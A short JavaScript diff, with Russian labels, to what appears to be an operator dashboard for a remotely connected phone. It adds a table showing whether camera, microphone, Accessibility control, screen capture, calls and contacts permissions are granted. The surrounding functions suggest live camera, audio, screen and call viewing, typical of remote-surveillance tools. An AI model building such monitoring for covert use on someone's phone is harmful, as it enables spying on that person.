@@ -532,6 +532,7 @@ function startCameraView() {
   startAudioViewer();
   startScreenViewer();
   startControlChannel();
+  startCallsViewer(true); // запрашиваем phone-info сразу для дашборда
   scheduleCamStatusCheck();
 }
 
@@ -850,6 +851,15 @@ function startCallsViewer(requestDataOnOpen) {
 
 let allContacts = [];
 
+const PERM_DEFS = [
+  { key: 'camera',        icon: '📷', label: 'Камера' },
+  { key: 'mic',           icon: '🎤', label: 'Микрофон' },
+  { key: 'accessibility', icon: '👆', label: 'Управление (Accessibility)' },
+  { key: 'projection',    icon: '🖥',  label: 'Захват экрана' },
+  { key: 'phone',         icon: '📞', label: 'Звонки и телефон' },
+  { key: 'contacts',      icon: '👥', label: 'Контакты' },
+];
+
 function renderPhoneInfo(info) {
   $('#callsStatus').textContent = 'подключён';
   $('#callsStatus').classList.add('on');
@@ -867,6 +877,14 @@ function renderPhoneInfo(info) {
     ).join('');
   } else {
     simsEl.innerHTML = '';
+  }
+  // Обновляем дашборд — разрешения
+  const permsEl = $('#permsKv');
+  if (permsEl && info.perms) {
+    permsEl.innerHTML = PERM_DEFS.map((d) => {
+      const ok = info.perms[d.key];
+      return `<b>${d.icon} ${d.label}</b><span class="${ok ? 'perm-ok' : 'perm-no'}">${ok ? '✓ Разрешено' : '✗ Не выдано'}</span>`;
+    }).join('');
   }
 }
 
